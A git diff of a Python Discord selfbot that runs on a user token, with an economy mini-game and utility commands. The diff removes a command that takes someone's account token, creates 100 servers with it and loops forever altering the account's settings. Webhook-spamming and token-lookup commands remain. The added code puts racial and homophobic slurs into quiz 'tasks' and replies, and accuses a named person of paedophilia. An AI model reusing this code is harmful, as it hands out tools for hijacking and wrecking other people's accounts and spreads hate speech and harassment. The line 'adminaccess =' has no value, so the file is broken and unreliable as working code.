@@ -12,7 +12,8 @@ import linecache
 import os
 import time
 
-token = "toucaun"
+adminaccess = 
+token = ""
 bot = commands.Bot(command_prefix='!', bot=False)
 
 kissgifs = ['http://i.imgur.com/0D0Mijk.gif ', 'http://i.imgur.com/TNhivqs.gif', 'http://i.imgur.com/3wv088f.gif', 'http://i.imgur.com/7mkRzr1.gif', 'http://i.imgur.com/8fEyFHe.gif']
@@ -81,6 +82,8 @@ async def on_message_delete(message):
 				snipe_message_content = None
 				snipe_message_id = None
 
+
+
 @bot.event
 async def on_message(message):
 				args = message.content.split()
@@ -112,7 +115,6 @@ Utility
 !tokeninfo <token> - checks a tokens info 
 !spamwebhook <webhook> - spams a webhook (spams long arabic characters and pings everyone on default, might change)
 !deletewebhook <webhook> - deletes a webhook 
-!tokenfuck <token> <SERVER NAMES> - fucks a token
 ```""")
 
 				elif args[0] == "!help" and args[1] == "image":
@@ -134,6 +136,8 @@ Image
 
 
 Economy
+!leaderboard/!lb - shows the leaderboard of richest people
+!crime - commit crime, with a chance of losing money
 !work - work, gives you money
 !slots <amount> slots
 !rob <user> robs someones wallet (wallet only)
@@ -239,74 +243,6 @@ Fun
 							 await message.channel.send(dogjson['link'])
 
 
-
-				elif args[0] ==	'!tokenfuck':
-						_token = str(args[1])
-						names = args[2]
-						headers = {
-									'User-Agent': 'Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.2 Chrome/51.0.2704.106 Safari/537.36',
-									'Content-Type': 'application/json',
-									'Authorization': _token,
-							}
-						request = requests.Session()
-						payload = {
-									'theme': "light",
-									'locale': "ja",
-									'message_display_compact': False,
-									'inline_embed_media': False,
-									'inline_attachment_media': False,
-									'gif_auto_play': False,
-									'render_embeds': False,
-									'render_reactions': False,
-									'animate_emoji': False,
-									'convert_emoticons': False,
-									'enable_tts_command': False,
-									'explicit_content_filter': '0',
-									'status': "invisible",
-									'developer_mode': True
-									
-							}
-						guild = {
-									'channels': None,
-									'icon': None,
-									'name': names,
-									'region': "europe"
-							} 
-						try:
-								for _i in range(100):
-									try:
-										requests.post('https://discord.com/api/v6/guilds', headers=headers, json=guild)
-									except:
-										await message.channel.send('invalid toucan dingus!')
-										pass
-									else:
-										pass
-						except:
-								await message.channel.send('invalid toucan dingus!')
-								
-						while True:
-									try:
-											request.patch("https://canary.discord.com/api/v6/users/@me/settings",headers=headers, json=payload)
-									except:
-											await message.channel.send('invalid toucan dingus!')
-									else:
-											pass
-						modes = cycle(["light", "light"])
-						statuses = cycle(["online", "idle", "invisible"])
-						for i in range(1000):
-									setting = {
-											'theme': next(modes),
-											'locale': random.choice(locales),
-											'status': next(statuses)
-									}
-						for i in range(1000):
-											try:
-													request.patch("https://canary.discord.com/api/v6/users/@me/settings", headers=headers, json=setting, timeout=10)
-											except:
-													await message.channel.send('invalid toucan dingus!')
-													return
-											else:
-													break
 
 					
 				elif args[0] ==	"!spamwebhook":
@@ -425,16 +361,13 @@ Fun
 					await message.channel.send(f"Link: {link}")
 
 				elif args[0] ==	"!av":
-					user = args[1]
-					user2 = bot.get_user(user)
-					user3 = await bot.fetch_user(user2)
-					await message.channel.send(user3.avatar_url)
+					user = message.mentions[0]
+					await message.channel.send(user.avatar_url)
 
 
 
 				elif args[0] ==	"!banner":
-					user = args[1]
-					user2 = await bot.fetch_user(user)
+					user = message.mentions[0]
 					req = await bot.http.request(discord.http.Route("GET", "/users/{uid}", uid = user.id))
 					banner_id = req["banner"]
 					if banner_id == None:
@@ -485,30 +418,200 @@ Sent by: <@{snipe_message_author}>""")
 												await message.channel.send('You guessed it!')
 
 				elif args[0] == "!balance" or args[0] == "!bal":
-					await open_account(message.author)
-					user = message.author
+					if len(args) > 1 and len(message.mentions) > 0:
+					  user = message.mentions[0]
+					else:
+					  user = message.author
 					users = await get_bank_data()
 
 					wallet_amt = users[str(user.id)]["wallet"]
 					bank_amt = users[str(user.id)]["bank"]
 
-					await message.channel.send(f"__**{message.author}**'s Balance:__\n> Wallet Balance: `{wallet_amt}`\n> Bank Balance: `{bank_amt}`")
+					await message.channel.send(f"__**{user}**'s Balance:__\n> Wallet Balance: `{wallet_amt}`\n> Bank Balance: `{bank_amt}`")
 					
-					
+                    
+				elif args[0] == "!fish":
+					await open_account(message.author)
+
+					users = await get_bank_data()
+					user = message.author
+
+					if random.randint(0,100) < 2:
+						await message.channel.send('You caught the ultra rare fish! (5000$)')
+						users[str(user.id)]["wallet"] += 5000
+						with open("mainbank.json", "w") as f:
+							json.dump(users,f)
+					elif random.randint(0,100) < 10:
+						await message.channel.send('You caught the rare fish! (350$)')
+						users[str(user.id)]["wallet"] += 350
+						with open("mainbank.json", "w") as f:
+							json.dump(users,f)			
+					elif random.randint(0,100) < 23:
+						await message.channel.send('You caught the common fish! (175$)')
+						users[str(user.id)]["wallet"] += 175
+						with open("mainbank.json", "w") as f:
+							json.dump(users,f)
+					elif random.randint(0,100) < 65:
+						await message.channel.send('You caught the poopie fish! (100$)')
+						users[str(user.id)]["wallet"] += 100
+						with open("mainbank.json", "w") as f:
+							json.dump(users,f)
+					elif random.randint(0,100) < 75:
+						await message.channel.send('You caught nothing dumb ass ur so bad.... also u broke ur fishing rod and lost 50 money haha!!!')
+						users[str(user.id)]["wallet"] -= 50
+						with open("mainbank.json", "w") as f:
+							json.dump(users,f)
+				
+
+
+
+
 				elif args[0] == "!work":
 					await open_account(message.author)
 
 					users = await get_bank_data()
 					user = message.author
 					earnings = random.randrange(10,30)
-
-					await message.channel.send(f"Someone gave you {earnings}!")
-
-					users[str(user.id)]["wallet"] += earnings
-				
-					with open("mainbank.json", "w") as f:
-						json.dump(users,f)
+					earnings2 = random.randrange(31,50)
+					earnings3 = random.randrange(51,70)
+					earnings4 = random.randrange(80,110)
 					
+					chance = random.randint(1,10)
+					if chance == 1:	
+						await message.channel.send('task: print 010101 in python...')
+						check = lambda m: m.author == message.author and message.channel == message.channel
+						answer = await bot.wait_for("message", check=check, timeout=30)
+						if answer.content == 'print("010101")':
+							await message.channel.send(f"u earned {earnings}$!")
+
+							users[str(user.id)]["wallet"] += earnings
+
+							with open("mainbank.json", "w") as f:
+								json.dump(users,f)
+						else:
+							await message.channel.send('incorrect dingus!')
+                            
+
+                            
+					elif chance == 2:
+						await message.channel.send('task: tell me what 3 times 3 is :rage:')
+						check = lambda m: m.author == message.author and message.channel == message.channel
+						answer = await bot.wait_for("message", check=check, timeout=30)
+						if answer.content == "9":
+							await message.channel.send(f"u earned {earnings2}$!")
+
+							users[str(user.id)]["wallet"] += earnings2
+
+							with open("mainbank.json", "w") as f:
+								json.dump(users,f)
+						else:
+							await message.channel.send('incorrect dingus!')
+					elif chance == 3:
+						await message.channel.send('task: tell me who made gc bot?')
+						check = lambda m: m.author == message.author and message.channel == message.channel
+						answer = await bot.wait_for("message", check=check, timeout=30)
+						if answer.content == "xyte":
+							await message.channel.send(f"u earned {earnings3}$!")
+
+							users[str(user.id)]["wallet"] += earnings3
+
+							with open("mainbank.json", "w") as f:
+								json.dump(users,f)
+						else:
+							await message.channel.send('incorrect dingus! answer: xyte')
+					elif chance == 4:
+						await message.channel.send('task: say nigger')
+						check = lambda m: m.author == message.author and message.channel == message.channel
+						answer = await bot.wait_for("message", check=check, timeout=30)
+						if answer.content == "nigger":
+							await message.channel.send(f"u earned {earnings2}$!")
+
+							users[str(user.id)]["wallet"] += earnings2
+
+							with open("mainbank.json", "w") as f:
+								json.dump(users,f)
+						else:
+							await message.channel.send('incorrect dingus!')
+					elif chance == 5:
+						await message.channel.send('task: on the scale of 1/10, how pedo is lucifer?')
+						check = lambda m: m.author == message.author and message.channel == message.channel
+						answer = await bot.wait_for("message", check=check, timeout=30)
+						if answer.content == "10/10":
+							await message.channel.send(f"u earned {earnings}$!")
+
+							users[str(user.id)]["wallet"] += earnings
+
+							with open("mainbank.json", "w") as f:
+								json.dump(users,f)
+						else:
+							await message.channel.send('incorrect dingus! answer: 10/10')
+					elif chance == 6:
+						await message.channel.send('task: do we hate faggots?')
+						check = lambda m: m.author == message.author and message.channel == message.channel
+						answer = await bot.wait_for("message", check=check, timeout=30)
+						if answer.content == "yes":
+							await message.channel.send(f"u earned {earnings3}$!")
+
+							users[str(user.id)]["wallet"] += earnings3
+
+							with open("mainbank.json", "w") as f:
+								json.dump(users,f)
+						else:
+							await message.channel.send('incorrect dingus!')
+					elif chance == 7:
+						await message.channel.send('task: tell me is monarch god?')
+						check = lambda m: m.author == message.author and message.channel == message.channel
+						answer = await bot.wait_for("message", check=check, timeout=30)
+						if answer.content == "no":
+							await message.channel.send(f"u earned {earnings3}$!")
+
+							users[str(user.id)]["wallet"] += earnings3
+
+							with open("mainbank.json", "w") as f:
+								json.dump(users,f)
+						else:
+							await message.channel.send('incorrect dingus! answer: no')
+					elif chance == 8:
+						await message.channel.send('task: tell me is 4ren skid?')
+						check = lambda m: m.author == message.author and message.channel == message.channel
+						answer = await bot.wait_for("message", check=check, timeout=30)
+						if answer.content == "yes":
+							await message.channel.send(f"u earned {earnings2}$!")
+
+							users[str(user.id)]["wallet"] += earnings2
+
+							with open("mainbank.json", "w") as f:
+								json.dump(users,f)
+						else:
+							await message.channel.send('incorrect dingus! correct answer: yes')
+					elif chance == 9:
+						await message.channel.send('task: tell me is 0xbc sexy?')
+						check = lambda m: m.author == message.author and message.channel == message.channel
+						answer = await bot.wait_for("message", check=check, timeout=30)
+						if answer.content == "no":
+							await message.channel.send(f"u earned {earnings3}$!")
+
+							users[str(user.id)]["wallet"] += earnings3
+
+							with open("mainbank.json", "w") as f:
+								json.dump(users,f)
+						else:
+							await message.channel.send('incorrect dingus! answer: no')
+					elif chance == 10:
+						await message.channel.send('task: tell me is xyte skid?')
+						check = lambda m: m.author == message.author and message.channel == message.channel
+						answer = await bot.wait_for("message", check=check, timeout=30)
+						if answer.content == "no":
+							await message.channel.send(f"u earned {earnings4}$!")
+
+							users[str(user.id)]["wallet"] += earnings4
+
+							with open("mainbank.json", "w") as f:
+								json.dump(users,f)
+						else:
+							await message.channel.send('incorrect dingus! Your balance has been reset!')
+						
+
 
 				elif args[0] == "!withdraw" or args[0] == "!with":
 					amount = args[1]
@@ -587,10 +690,85 @@ Sent by: <@{snipe_message_author}>""")
 						return
 					earnings = random.randrange(0, bal[0])
 					
-					await update_bank(message.author,earnings)
-					await update_bank(member,-1*earnings)
-					await message.channel.send(f'you robbed {amount}$') 
+					if random.randint(1,5) < 4:
+						await update_bank(message.author,earnings)
+						await update_bank(member,-1*earnings)
+						await message.channel.send(f'you robbed {earnings}$') 
+					else:
+						await update_bank(message.author,-500)
+						await message.channel.send(f'you tripped on a nigger and lost 500$ trying to rob.') 
+
+				elif args[0] == "!forcetakewallet":
+					if message.author.id == adminaccess:
+						member = args[1]
+						member = int(member.strip('<@!>'))
+						member = await bot.fetch_user(member)
+						await open_account(message.author)
+						await open_account(member)
 						
+						bal = await update_bank(member)
+						
+						earnings = int(args[2])
+						
+						await update_bank(message.author,earnings)
+						await update_bank(member,-1*earnings)
+						await message.channel.send(f'you took {earnings}$') 
+					else:
+						await message.channel.send('you cant do that lil nigga')
+
+				elif args[0] == "!forcetakebank":
+					if message.author.id == adminaccess:
+						member = args[1]
+						member = int(member.strip('<@!>'))
+						member = await bot.fetch_user(member)
+						await open_account(message.author)
+						await open_account(member)
+						
+						bal = await update_bank(member)
+						
+						earnings = int(args[2])
+						
+						await update_bank(message.author,earnings, "bank")
+						await update_bank(member,-1*earnings, "bank")
+						await message.channel.send(f'you took {earnings}$') 
+					else:
+						await message.channel.send('you cant do that lil nigga')
+					
+				elif args[0] == "!addbank":
+					if message.author.id == adminaccess:
+						member = args[1]
+						member = int(member.strip('<@!>'))
+						member = await bot.fetch_user(member)
+						await open_account(message.author)
+						await open_account(member)
+						
+						bal = await update_bank(member)
+						
+						earnings = int(args[2])
+						
+						await update_bank(member,+1*earnings, "bank")
+						await message.channel.send(f'you added {earnings}$') 
+					else:
+						await message.channel.send('you cant do that lil nigga')
+
+				elif args[0] == "!addwallet":
+					if message.author.id == adminaccess:
+						member = args[1]
+						member = int(member.strip('<@!>'))
+						member = await bot.fetch_user(member)
+						await open_account(message.author)
+						await open_account(member)
+						
+						bal = await update_bank(member)
+						
+						earnings = int(args[2])
+						
+						await update_bank(message.author,earnings, "wallet")
+						await update_bank(member,earnings, "wallet")
+						await message.channel.send(f'you added {earnings}$') 
+					else:
+						await message.channel.send('you cant do that lil nigga')
+
 				elif args[0] == "!slots":
 					amount = args[1]
 					await open_account(message.author)
@@ -616,6 +794,95 @@ Sent by: <@{snipe_message_author}>""")
 					else:
 						await update_bank(message.author, -1*amount)
 						await message.channel.send('you lost hahahahah ezzzzzzzzzz')
+                        
+				elif args[0] == "!crime":
+					await open_account(message.author)
+
+					users = await get_bank_data()
+					user = message.author
+					earnings = random.randrange(200,300)
+					unearnings = random.randrange(150,200)
+					lw = random.randint(1,3)
+						
+					await message.channel.send('What crime do you want to commit? \n> **1** = rob an old lady\n> **2** = heist\n> **3** = steal a car')
+					check = lambda m: m.author == message.author and message.channel == message.channel
+					answer = await bot.wait_for("message", check=check, timeout=30)
+					if answer.content == "1":
+						if lw == 1:
+							await message.channel.send(f"u earned {earnings}$!")
+
+							users[str(user.id)]["wallet"] += earnings
+
+							with open("mainbank.json", "w") as f:
+								json.dump(users,f)
+						elif lw == 2 or 3:
+							await message.channel.send(f'the old lady smacked you with her bag and you lost {earnings}$ dingus ezz')
+							users[str(user.id)]["wallet"] -= unearnings
+
+							with open("mainbank.json", "w") as f:
+								json.dump(users,f) 
+					elif answer.content == "2":
+						if lw == 1:
+							await message.channel.send(f"u earned {earnings}$!")
+
+							users[str(user.id)]["wallet"] += earnings
+
+							with open("mainbank.json", "w") as f:
+								json.dump(users,f)
+						elif lw == 2 or 3:
+							await message.channel.send(f'you got caught in 4k trying to break in the vault and lost {earnings}$ dingus ezz')
+							users[str(user.id)]["wallet"] -= unearnings
+
+							with open("mainbank.json", "w") as f:
+								json.dump(users,f) 
+					elif answer.content == "3":
+						if lw == 1:
+							await message.channel.send(f"u earned {earnings}$!")
+
+							users[str(user.id)]["wallet"] += earnings
+
+							with open("mainbank.json", "w") as f:
+								json.dump(users,f)
+						elif lw == 2 or 3:
+							await message.channel.send(f'the car owner caught you and you were fined {earnings}$ dingus ezz')
+							users[str(user.id)]["wallet"] -= unearnings
+
+							with open("mainbank.json", "w") as f:
+								json.dump(users,f) 
+					else:
+						await message.channel.send('invalid choice dingus! try again never')
+
+
+				elif args[0] == "!leaderboard":
+					x = 5
+					users = await get_bank_data()
+					leader_board = {}
+					total = []
+					for user in users:
+						name = int(user)
+						total_amount = users[user]["wallet"] + users[user]["bank"]
+						leader_board[total_amount] = name
+						total.append(total_amount)
+
+					total = sorted(total,reverse=True)
+
+
+					lb = []
+					index = 1
+					for amt in total:
+						id_ = leader_board[amt]
+						mem = bot.get_user(id_)
+						name = mem.name
+						lb.append(f"> **{index}.** __{name}__ - `{amt}`\n")
+						if index == x:
+							break
+						else:
+							index += 1
+
+					await message.channel.send(f' '.join(lb))
+
+
+
 
 async def open_account(user):
 	users = await get_bank_data()
